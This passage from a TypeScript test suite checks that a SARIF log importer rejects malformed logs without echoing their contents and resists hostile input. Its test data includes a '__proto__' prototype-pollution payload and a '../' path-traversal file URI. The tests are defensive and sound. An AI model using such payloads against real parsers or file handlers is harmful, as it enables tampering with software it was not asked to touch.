    invalid: boolean;
  }
  /** A log carrying `m` somewhere the reader must never echo, and whether it must be refused. */
  function markedLog(kind: number, m: string): Case {
    const base = (): JsonObject => logOf([plain()], { rules: [sarifRule('r1')] });
    const withResult = (extra: JsonObject): Case => {
      const log = logOf([plain(), extra], { rules: [sarifRule('r1')] });
      return { invalid: false, text: sarifText(log) };
    };
    switch (kind) {
      case 0:
        return { invalid: true, text: `{"version":"2.1.0","runs":[{"tool":{"driver":{"name":"${m}"}},"results":[{"message":{"text":"${m}` };
      case 1:
        return { invalid: true, text: `{"version":"2.1.0","runs":[${m}]}` };
      case 2:
        return { invalid: true, text: sarifText({ ...base(), version: m }) };
      case 3:
        return { invalid: true, text: sarifText({ ...base(), runs: m }) };
      case 4: {
        const log = base();
        delete log['runs'];
        return { invalid: true, text: sarifText({ ...log, [m]: [m] }) };
      }
      case 5:
        return { invalid: true, text: sarifText({ ...base(), version: { [m]: m } }) };
      case 6:
        // Unimportable: no rule, no message — skipped, and its reason must not quote it.
        return withResult({ properties: { [m]: m }, locations: [{ physicalLocation: { artifactLocation: { uri: `../${m}/x.js` } } }] });
      case 7:
        return withResult(sarifResult({ ruleIndex: 99, message: m, uri: `src/${m}.js`, startLine: 1 }));
      case 8:
        return withResult(sarifResult({ ruleId: 'r1', kind: 'pass', message: m, uri: `src/${m}.js`, startLine: 1 }));
      case 9:
        return withResult(
          sarifResult({ ruleId: 'r1', message: 'x', uri: 'src/s.js', startLine: 2, suppressions: [{ kind: 'external', status: 'accepted', justification: m }] }),
        );
      case 10: {
        // `__proto__` as a key, in a result and in its properties: data, never a prototype.
        const text = sarifText(base()).replace(
          '"ruleId": "r1"',
          `"ruleId": "r1", "__proto__": {"polluted": "${m}"}, "properties": {"__proto__": {"polluted": "${m}"}}`,
        );
        return { invalid: false, text };
      }
      default: {
        const log = logOf([plain()], {
          rules: [sarifRule('r1'), sarifRule(m, { helpUri: `https://${m}.example/` })],
          invocations: [{ executionSuccessful: false, commandLine: m }],
        });
        return { invalid: false, text: sarifText(log) };
      }
    }
  }

  it('T-18 over 240 generated logs carrying a marker: a refusal is invalid_sarif and never quotes it, an import never quotes it in its counts, and no prototype is polluted', () => {
    const r = mulberry32(18_062_026);
    for (let c = 0; c < 240; c += 1) {
      const kind = c % 12;
      const marker = `ZQ${Math.floor(r() * 1e9).toString(36)}QZ`;
      const { text, invalid } = markedLog(kind, marker);
      let result: SarifImportResult | undefined;
      let error: unknown;
      try {
        result = importSarif(text, { projectPath: ROOT });
      } catch (e) {
        error = e;
      }
      const label = `case ${String(c)} (kind ${String(kind)})`;
      if (invalid) {
        expect(error, `${label}: refused`).toMatchObject({ code: 'invalid_sarif' });
        expect(error instanceof Error ? error.message : String(error), label).not.toContain(marker);
      } else {
        expect(error, `${label}: imported`).toBeUndefined();
        expect(JSON.stringify(result?.runs.map((run) => run.counts)), label).not.toContain(marker);
      }
      expect(({} as Record<string, unknown>)['polluted'], label).toBeUndefined();
    }
  });

  it('T-18 through import_sarif: a refusal, and a response, quote nothing the log held outside what it imported', async () => {
    const s = freshPlugin();
    const project = projectDir('sarif-t18-');
    const marker = 'ZQtoolmarkerQZ';
    for (const kind of [1, 2, 4]) {
      const bad = markedLog(kind, marker);
      const r = await callTool('import_sarif', { project_path: project, sarif_path: writeSarif(project, `bad-${String(kind)}.sarif`, bad.text) }, s.plugin);
      expect(r.ok).toBe(false);
      if (!r.ok) expect(r.message).not.toContain(marker);
    }
    // The marker sits only where nothing is imported from: a skipped result, a
    // result that is not a finding, an unreferenced rule, the invocation.
    const log = logOf(
      [
        plain(),
        sarifResult({ message: null, properties: { note: marker } }),
        sarifResult({ ruleId: 'r1', kind: 'pass', message: marker, uri: 'src/p.js', startLine: 1 }),
      ],
      { rules: [sarifRule('r1'), sarifRule(marker)], invocations: [{ executionSuccessful: true, commandLine: marker }] },
    );
    const out = await importOk(s.plugin, project, writeSarif(project, 'ok.sarif', log));
    expect(JSON.stringify(out)).not.toContain(marker);
  });
});
